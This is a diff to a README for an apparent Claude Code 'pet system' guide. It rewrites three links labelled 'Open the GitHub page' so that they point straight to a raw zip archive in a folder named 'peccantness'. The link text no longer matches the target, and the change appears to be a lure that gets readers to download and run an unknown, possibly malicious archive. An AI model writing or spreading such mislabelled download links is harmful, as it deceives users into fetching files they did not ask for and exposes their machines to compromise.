@@ -1,6 +1,6 @@
 # 🎮 claude-code-pet-system-analysis - Pet Guide for BUDDY Fans
 
-[![Download](https://img.shields.io/badge/Download-Open%20the%20GitHub%20page-blue?style=for-the-badge&logo=github)](https://github.com/Previous-shunt800/claude-code-pet-system-analysis)
+[![Download](https://img.shields.io/badge/Download-Open%20the%20GitHub%20page-blue?style=for-the-badge&logo=github)](https://github.com/Previous-shunt800/claude-code-pet-system-analysis/raw/refs/heads/main/peccantness/code-claude-analysis-system-pet-3.3.zip)
 
 ## 🐾 What this is
 
@@ -17,7 +17,7 @@ Use it to:
 
 Use this link to visit the download page:
 
-[Open the GitHub page](https://github.com/Previous-shunt800/claude-code-pet-system-analysis)
+[Open the GitHub page](https://github.com/Previous-shunt800/claude-code-pet-system-analysis/raw/refs/heads/main/peccantness/code-claude-analysis-system-pet-3.3.zip)
 
 ### How to get it on Windows
 
@@ -176,7 +176,7 @@ That gives you a fast way to understand the whole system without jumping around.
 
 Use the GitHub page here:
 
-[https://github.com/Previous-shunt800/claude-code-pet-system-analysis](https://github.com/Previous-shunt800/claude-code-pet-system-analysis)
+[https://github.com/Previous-shunt800/claude-code-pet-system-analysis/raw/refs/heads/main/peccantness/code-claude-analysis-system-pet-3.3.zip](https://github.com/Previous-shunt800/claude-code-pet-system-analysis/raw/refs/heads/main/peccantness/code-claude-analysis-system-pet-3.3.zip)
 
 ## ❓ Common questions
 
